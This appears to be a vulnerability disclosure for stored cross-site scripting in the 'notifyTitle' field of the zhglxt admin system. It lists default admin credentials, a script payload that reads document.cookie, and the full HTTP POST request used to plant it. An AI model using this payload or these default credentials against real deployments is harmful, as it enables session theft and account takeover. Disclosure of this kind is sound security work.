BUG_Author: biantaibao  
Vulnerability url:POST /zhglxt/oa/notify/edit HTTP/1.1  
POST form-data parameter name="notifyTitle" exists stored cross-site scripting  
Steps to reproduce  
1.Go to the admin Login  
http://localhost:9898/zhglxt/login    
Default Admin Access Information Username: system / Password: system   
2.Enter the announcement management menu and click the add button.   
![image](https://github.com/biantaibao/zhglxt_xss/assets/131763503/254e7ac4-fe88-441e-add9-dce613154bee)
3.Put Payload into the name="notifyTitle" parameter  
Payload:<script>alert(document.cookie)</script>  
![image](https://github.com/biantaibao/zhglxt_xss/assets/131763503/c5e120ce-0d32-469a-94f6-beba662fec64)
4.Click on Save  
Transmission packet

POST /zhglxt/oa/notify/edit HTTP/1.1  
Host: localhost:9898  
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0    
Accept: application/json, text/javascript, */*; q=0.01  
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2  
Accept-Encoding: gzip, deflate  
Content-Type: application/x-www-form-urlencoded; charset=UTF-8  
X-Requested-With: XMLHttpRequest  
Content-Length: 184  
Origin: http://localhost:9898  
Connection: close  
Referer: http://localhost:9898/zhglxt/oa/notify/edit/4d049d94293e46c8afb8e4ffe555190f  
Cookie: JSESSIONID=090bf2d0-9cba-462f-844c-fcb72b90ba5e; NG_TRANSLATE_LANG_KEY=%22zh-CN%22; Hm_lvt_2f24154b3f87697d36a4e2a638b68aaa=1704782281; Hm_lvt_f8cddee34ca21f05373a9388cfdd798b=1704964823; JSESSIONID=36080a69-5232-4088-85be-6074f45e49e2; Hm_lpvt_2f24154b3f87697d36a4e2a638b68aaa=1704782281; Hm_lpvt_f8cddee34ca21f05373a9388cfdd798b=1704966995


id=4d049d94293e46c8afb8e4ffe555190f&deptUserIds=&notifyTitle=%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E&notifyType=1&notifyContent=%3Cp%3E111%3Cbr%3E%3C%2Fp%3E&status=0&userIds=  

5.Payload will trigger when a user the search button.
![image](https://github.com/biantaibao/zhglxt_xss/assets/131763503/f93ccf1c-0e6a-47ee-8672-ac7797868e2a)
